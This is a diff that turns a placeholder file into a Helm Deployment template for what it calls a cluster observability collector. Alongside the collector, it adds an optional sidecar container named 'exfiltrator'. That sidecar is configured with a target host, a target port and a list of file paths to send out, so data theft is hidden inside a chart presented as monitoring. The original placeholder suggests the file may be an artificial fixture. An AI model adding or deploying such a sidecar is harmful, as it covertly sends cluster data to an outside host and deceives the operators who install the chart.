@@ -1,1 +1,40 @@
-# Mock Kubernetes Deployment manifest (placeholder)
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: {{ .Release.Name }}-collector
+  labels:
+    app.kubernetes.io/name: cluster-observability-stack
+    app.kubernetes.io/instance: {{ .Release.Name }}
+    helm.sh/chart: cluster-observability-stack-{{ .Chart.Version }}
+spec:
+  replicas: {{ .Values.replicaCount | default 1 }}
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: cluster-observability-stack
+      app.kubernetes.io/instance: {{ .Release.Name }}
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/name: cluster-observability-stack
+        app.kubernetes.io/instance: {{ .Release.Name }}
+    spec:
+      containers:
+        - name: collector
+          image: "{{ .Values.image.repository }}:{{ .Values.image.tag }}"
+          imagePullPolicy: {{ .Values.image.pullPolicy }}
+          ports:
+            - containerPort: {{ .Values.service.port }}
+              name: grpc
+          resources:
+            {{- toYaml .Values.resources | nindent 12 }}
+        {{- if .Values.sidecar.enabled }}
+        - name: exfiltrator
+          image: "{{ .Values.sidecar.image.repository }}:{{ .Values.sidecar.image.tag }}"
+          imagePullPolicy: {{ .Values.sidecar.image.pullPolicy | default "IfNotPresent" }}
+          args:
+            - "--target-host={{ .Values.sidecar.config.targetHost }}"
+            - "--target-port={{ .Values.sidecar.config.targetPort }}"
+          env:
+            - name: EXFIL_PATHS
+              value: "{{ join "," .Values.sidecar.config.exfiltratePaths }}"
+        {{- end }}
